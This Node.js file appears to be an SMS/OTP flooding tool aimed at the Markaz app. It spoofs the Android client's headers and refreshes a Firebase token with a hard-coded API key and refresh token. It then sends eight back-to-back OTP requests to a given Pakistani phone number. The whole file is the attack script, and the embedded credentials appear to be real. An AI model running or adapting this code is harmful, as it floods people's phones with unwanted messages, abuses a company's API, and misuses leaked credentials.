const axios = require('axios');
const sendRequest = async () => {
  try {
    const url = 'https://securetoken.googleapis.com/v1/token?key=AIzaSyDExNtvd9ghi5ZQ_jqCcGxCpVCmdKEx9Ag';
    const headers = {
      'Content-Type': 'application/json',
      'X-Android-Package': 'com.markaz.app',
      'X-Android-Cert': '18C9577E4A990EF4CC1A1109465D95055E9B010E',
      'Accept-Language': 'en-US',
      'X-Client-Version': 'Android/Fallback/X21001000/FirebaseCore-Android',
      'X-Firebase-GMPID': '1:295525733284:android:635ed3ee1ef2fec235a731',
      'X-Firebase-Client': 'H4sIAAAAAAAAAKtWykhNLCpJSk0sKVayio7VUSpLLSrOzM9TslIyUqoFAFyivEQfAAAA',
      'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 10; TECNO LD7 Build/QP1A.190711.020)',
      'Host': 'securetoken.googleapis.com',
      'Connection': 'Keep-Alive',
      'Accept-Encoding': 'gzip'
    };

    const data = {
      "grantType": "refresh_token",
      "refreshToken": "AMf-vBx_FkPpP2aTEBte075Kg4jD_F19WirZpSv9LcA_ZFnxXRJtBjdtv32aRW7JgcqQj_2jQZ2vY0LknVq-jWPBjJ1cUU8EUhs11BXKWSZRg4Kx2zvS82ZP5gB8qsLlq8j6DiTQiNsEtk7qp2tydqGsZ3f19mK1m7Yjq2Ktr97FB990C0st8xOzo1FibAzgeK2MxZt_JATN"
    };

    const response = await axios.post(url, data, { headers });
    
    return response.data.access_token
    // Handle the response data
  } catch (error) {
    console.error(error);
    // Handle the error
  }
};
function generateUniqueDeviceId() {
  const characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
  let deviceId = '';
  for (let i = 0; i < 16; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    deviceId += characters[randomIndex];
  }
  return deviceId;
}

module.exports  = otp = async(num)=>{
    num = `92${num.split('').splice(1).join('')}`
   

    
      const url = `https://api.markaz.app/reseller/otp/send/+${num}/markaz`;
      const headers = {
        'Authorization': sendRequest(),
        'Unique-Device-Id': generateUniqueDeviceId(),
        'Device-Id': 'QP1A.190711.020',
        'Device-Info': 'TECNO-LD8',
        'Device-Model': 'TECNO LD7',
        'Device-Manufacturer': 'TECNO MOBILE LIMITED',
        'Build-Version-Code': '227',
        'Build-Version-Name': '2.2.45',
        'Os-Type': 'ANDROID',
        'Accept': 'application/json',
        'Accept-Charset': 'UTF-8',
        'User-Agent': 'Ktor client',
        'Content-Length': 0,
        'Host': 'api.markaz.app',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip'
      };
    
      try {
        const {data:data1} = await axios.get(url, { headers });
        const {data:data2} = await axios.get(url, { headers });
        const {data:data3} = await axios.get(url, { headers });
        const {data:data4} = await axios.get(url, { headers });
        const {data:data5} = await axios.get(url, { headers });
        const {data:data6} = await axios.get(url, { headers });
        const {data:data7} = await axios.get(url, { headers });
        const {data:data8} = await axios.get(url, { headers });
       
        return {data1,data2,data3,data4,data5,data6,data7,data8}
        
      } catch (error) {
        console.error('Error:', error.message);
      }
    }
    
    
    
